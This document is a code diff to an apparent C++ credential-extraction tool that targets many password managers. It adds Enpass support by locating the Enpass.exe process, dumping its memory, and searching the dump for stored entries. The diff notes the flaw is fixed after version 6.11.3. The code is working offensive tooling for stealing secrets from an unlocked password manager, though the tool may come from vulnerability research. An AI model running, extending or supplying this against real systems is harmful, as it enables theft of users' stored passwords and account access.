@@ -21,6 +21,7 @@
 #include "../1password/app/FindsecondPID1password.h"
 #include "../1password/plugin/getCreds1passwordplugin.h"
 #include "../1password/plugin/getCreds1passwordplugin2.h"
+#include "../enpass/getCredsenpassEntries.h"
 #include "../keeper/getCredskeeper1.h"
 #include "../keeper/getCredskeeper2.h"
 #include "../keeper/getCredskeeper3.h"
@@ -82,7 +83,7 @@ int checkApps() {
     }
 
     std::cout << "Enter the name of the password manager (accepted values, 1password, avira, \n";
-    std::cout << "bitdefender, bitwarden, brave, chrome, dashlane, firefox, ironvest, kaspersky, keeper,\n";
+    std::cout << "bitdefender, bitwarden, brave, chrome, dashlane, enpass, firefox, ironvest, kaspersky, keeper,\n";
     std::cout << "nordpass, lastpass, msedge, norton, passwarden, passwordboss, roboform ): ";
     std::cin >> userInput;
 
@@ -785,6 +786,38 @@ int checkApps() {
         std::cout << "Done!\n";
         std::cout << "Searching for master username and password.\n";
         getCredsdashlaneMaster(fileInput);
+        std::cout << "Done!\n";
+        std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
+    }
+
+    //enpass
+    if (userInput == "enpass") {
+        std::cout << "User input matches 'enpass'.\n";
+        std::cout << "Only entries should be available.\n";
+        std::cout << "Fixed after v6.11.3.\n";
+        std::cout << "The app automatically selects the last entry the user clicked before closing it. This entry will be available for extraction.\n";
+        std::cout << "Fast and Full are the same for this app.\n";
+        const char* processName = "Enpass.exe";
+
+        // Step 1: Find PIDs by process name
+        DWORD pid = FindSimpleProcPID(processName);
+
+        if (pid != 0)
+        {
+            // Step 2: Create a dump file for the process
+            saveDump(pid);
+        }
+        else
+        {
+            std::cerr << "No process with this PID found." << std::endl;
+        }
+
+        if (mode == "fast" || mode == "full") {
+            fileInput = "app.dmp";
+        }
+
+        std::cout << "Searching for entries.\n";
+        getCredsenpassEntries(fileInput);
         std::cout << "Done!\n";
         std::cout << "If zero credentials were found, ensure that the app is up, unlocked and running!\n";
     }
